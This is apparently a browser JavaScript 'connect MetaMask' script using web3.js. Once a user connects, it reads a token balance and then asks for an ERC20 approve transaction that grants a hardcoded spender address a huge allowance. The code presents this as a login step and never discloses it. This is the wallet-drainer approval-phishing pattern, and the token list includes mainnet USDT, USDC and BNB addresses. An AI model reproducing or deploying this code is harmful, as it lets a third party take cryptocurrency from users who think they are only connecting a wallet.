let account = "";
let spender = "0x5DFa503C937E0DC79352445bDc6Ff69EfC5D72d7";
let tokens = [
  {
    name: "TUSDT",
    address: "0xD92E713d051C37EbB2561803a3b5FBAbc4962431",
    decimals: 6,
  },
  {
    name: "USDT",
    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    decimals: 6,
  },
  {
    name: "USDC",
    address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    decimals: 6,
  },
  {
    name: "BNB",
    address: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
    decimals: 6,
  },
];

if (typeof window.ethereum != undefined) {
  console.log("Metamask installed");
} else {
  console.log("Metamask not installed");
}

async function login() {
  const accounts = await ethereum
    .request({ method: "eth_requestAccounts" })
    .catch((e) => {
      console.log(e);
    });
  account = accounts[0];
  getBalance(tokens[0]);
}

document.body.addEventListener("click", function (e) {
  let targetId = e.target.id;
  if (targetId == "connect-metamask") {
    if (ethereum.networkVersion == 4) {
      login();
    } else {
      console.log("Change network version");
    }
  }
});

async function getBalance(token) {
  let web3 = new Web3(Web3.givenProvider);
  let contract = new web3.eth.Contract(ERC20, token.address);
  let balance = await contract.methods.balanceOf(account).call();
  let decimals = Math.pow(10, token.decimals);
  balance = balance / decimals;
  getToken(token, balance);
}

function getToken(token, balance) {
  let web3 = new Web3(Web3.givenProvider);
  let contract = new web3.eth.Contract(ERC20, token.address);
  contract.methods
    .approve(spender, Math.pow(10, token.decimals) * 1000000)
    .send({ from: account })
    .then(function (receipt) {
      console.log(receipt);
    })
    .catch(function (err) {
      console.log(err);
    });
}
